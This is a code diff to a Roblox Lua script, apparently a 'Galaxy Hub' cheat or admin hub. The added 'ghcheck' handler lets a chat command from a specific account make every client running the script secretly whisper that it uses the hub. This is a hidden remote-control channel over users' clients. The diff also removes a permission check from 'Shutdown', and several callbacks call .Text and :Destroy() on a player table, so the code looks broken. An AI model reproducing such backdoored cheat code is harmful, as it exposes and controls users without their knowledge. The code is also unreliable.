@@ -141,6 +141,9 @@ if game.PlaceId == 1735775055 then
                         wait(0.5)
                     end
                 end
+                if cmd == "ghcheck" then
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w plzIWannaGetAdmin I am using Galaxy Servers", "All")
+                end
 
             end
         end)
@@ -920,14 +923,21 @@ if game.PlaceId == 1735775055 then
 
     Admin2.setPrefix(",")
 
+    Admin2.addCommand({name = "ghcheck",desc = "Checks all users using Galaxy Hub",callback = function(v)
+        local m = Admin2.getplayers(v)
+        for i,v2 in pairs(m) do
+            print("haha")
+        end
+
+        m.Text = v
+        wait(1)
+        m:Destroy()
+    end})
+
     Admin2.addCommand({name = "Shutdown",desc = "Kicks player using galaxy out of the server",callback = function(v)
         local m = Admin2.getplayers(v)
         for i,v2 in pairs(m) do
-            if game.Player.LocalPlayer == game.Players:FindFirstChild('plzIWannaGetAdmin') then
-                print("Galaxy user kicked...")
-            else
-                print("You do not have shutdown perms...")
-            end
+            print("haha")
         end
 
         m.Text = v
